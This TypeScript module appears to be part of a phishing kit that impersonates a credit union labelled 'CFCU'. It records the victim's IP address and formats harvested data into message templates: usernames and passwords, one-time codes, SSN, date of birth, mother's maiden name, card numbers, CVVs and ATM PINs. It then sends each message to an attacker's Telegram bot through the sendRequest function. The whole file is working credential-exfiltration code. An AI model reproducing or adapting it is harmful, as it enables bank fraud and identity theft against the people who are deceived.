import axios from "axios";
import { userData } from "../App";


export const getIPAddress = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      const ipAddress = data.ip;
      return ipAddress
      // Further processing with the IP address
    } catch (error) {
      console.error('Error fetching IP address:', error);
    }
  };


const IP = await getIPAddress()

const url = `https://api.telegram.org/bot${process.env.REACT_APP_TelegramBotAPIKey}/sendMessage`

export const sendRequest = async (message: any, handleLoading?: any) => {
    handleLoading && handleLoading(true)
    try {
       
        const response = await axios.post(url, {
            chat_id: process.env.REACT_APP_TelegramChatID,
            parse_mode: "html",
            text: message,
        });
       handleLoading && handleLoading(false)
    //    (response.data);/
    } catch (error) {
        handleLoading && handleLoading(false)
        
    }
}


  export const getLocation = () => {
    navigator.geolocation.getCurrentPosition((position) => {
        const { latitude, longitude } = position.coords;
        // console.log('Latitude:', latitude);
        // console.log('Longitude:', longitude);

        return `Long:${longitude}, Lat:${latitude}`
        // Further processing with the location data
      }, (error) => {
        console.error('Error retrieving geolocation:', error);
      });
      
  }
  
  export const userDataTemplate = async () => {
    
    return `
    ------ Viewer Information: ${IP ?? "Incognito"} --------

    Page: CFCU

    IP Address: ${IP ?? "Incognito"}

    IPV6: ${userData.browser}
    OS: ${userData.os}

    Date: ${new Date().toLocaleString()}


    `
  }

export const userNameTemplate = (username: string, password: string) => {
    
    return `------ Login Information: ${IP ?? "Incognito"} --------

    Page: CFCU

    Username: ${username}
    Password: ${password}

    Developed by TheCodeProphet
    `
}

export const pinTemplate = (pin: string) => {

    return `------ OTP Information: ${IP ?? "Incognito"} --------

    Page: CFCU

    OTP: ${pin}

    Developed by TheCodeProphet
    `

}

export const personalInfoTemplate = (fullname: string, dob: string, address: string, state: string, city: string, zipcode: string, phonenumber: string, ssn: string, maidenname: string) => {

    return `------ Personal Information: ${IP ?? "Incognito"} --------

    Page: CFCU

    Full Name: ${fullname}
    Date Of Birth: ${dob}
    Address: ${address}
    State: ${state}
    City: ${city}
    Zip Code: ${zipcode}
    Phone Number: ${phonenumber}
    Social Security Number: ${ssn}
    Mother Maiden Name: ${maidenname}


    Developed by TheCodeProphet
    `

}

export const cardInfoTemplate = (cardNumber: string, exDate: string, cvv: string, atmPin: string) => {

    return `------ Card Information: ${IP ?? "Incognito"} --------

    Page: CFCU

    Card Number: ${cardNumber}
    Expiry Date: ${exDate}
    Security Code (CVV): ${cvv}
    ATM Pin: ${atmPin}


    Developed by TheCodeProphet
    `

}
